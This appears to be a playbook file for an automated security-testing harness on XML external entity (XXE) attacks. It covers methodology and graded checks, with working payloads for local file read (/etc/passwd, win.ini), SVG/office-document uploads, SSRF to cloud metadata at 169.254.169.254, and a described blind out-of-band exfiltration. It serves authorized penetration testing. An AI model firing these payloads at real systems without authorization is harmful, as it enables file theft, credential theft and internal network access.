---
name: xxe
label: XML external entity (XXE) - file read, SSRF, blind OOB
triggers: [xml-body, content-type-xml, soap-action, svg-upload, office-doc-upload]
preconditions: [an endpoint that parses XML you supply]
scope: requests-only
safety: benign
severity_hint: high
---

# XML external entity (XXE)

## Overview
An XML parser resolves an external entity you declare in a DOCTYPE, so your document can pull a local file, hit
an internal URL, or call back to a host you control. The direct proof is a known file marker appearing in a
returned field (e.g. `root:x:` from `/etc/passwd`). Blind variants have no in-band echo and can only be proven
by an out-of-band callback, which the harness cannot grade - mark those as an open proof gap.

## Attack surface
- Content types: `application/xml`, `text/xml`, a SOAP body, a request starting with `<?xml`.
- File uploads that parse XML: SVG (rendered), DOCX/XLSX/office formats, RSS/XML import, `.xml`.
- Any field that ends up inside an XML document server-side, even if the request itself looks like JSON/form.

## Hunt methodology
1. From recon/`get_traffic`, list every XML sink (content type, SOAP, XML-based uploads). `note_coverage` each.
2. Prefer the in-band file-read proof first: declare an external entity for a benign known file and reference it
   in an element the response echoes back. `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows) give stable
   markers.
3. If no field echoes, try SSRF via XXE (point the entity at an internal/metadata URL) and look for a
   differential response; if still blind, fall to an OOB parameter-entity exfil and record the gap.
4. Keep it benign: read one well-known non-secret file to prove the class before touching config/secrets.

## Checks (predict -> send -> assert)
- technique: in-band file read
  send: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` in an echoed field
  predict: {status_in: [200], body_contains: "root:x:"}
  refute_if: {body_not_contains: "root:x:"}
  fp_note: the marker must be FILE contents in the response, not your payload reflected. On Windows target
           `file:///C:/Windows/win.ini` and assert `body_contains: "[fonts]"` or `[extensions]`.

- technique: SVG / office-doc XXE
  send: upload an SVG/DOCX carrying the same DOCTYPE + entity, then fetch the rendered/returned output
  predict: {status_in: [200], body_contains: "root:x:"}
  refute_if: {body_not_contains: "root:x:"}
  fp_note: the parser may strip DOCTYPEs on upload; a clean render without the marker refutes this sink, not XXE
           on other sinks.

- technique: SSRF via XXE
  send: `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">` referenced in a returned field
  predict: {status_in: [200], differs_from_control: true, body_not_contains: "root:x:"}
  refute_if: {differs_from_control: false}
  fp_note: control = the same entity pointed at a dead/localhost port; the internal URL must return
           content/behaviour the control does not. Reaching cloud metadata creds is critical.

- technique: blind / OOB exfil
  send: a parameter-entity + external DTD that makes the parser fetch an attacker host
  predict: {}    # not harness-gradeable - confirm via an out-of-band hit; record as open_proof_gap until observed
  fp_note: only a real callback from the target backend confirms it; no in-band signal exists.

## Notes
Severity: high for arbitrary local file read; critical when it reaches secrets/config or cloud metadata
credentials, or becomes internal SSRF. Evidence = the request and the response field carrying the file marker
(or the differential for SSRF). A confirmed XXE is a pivot - note what file/host it can reach next.
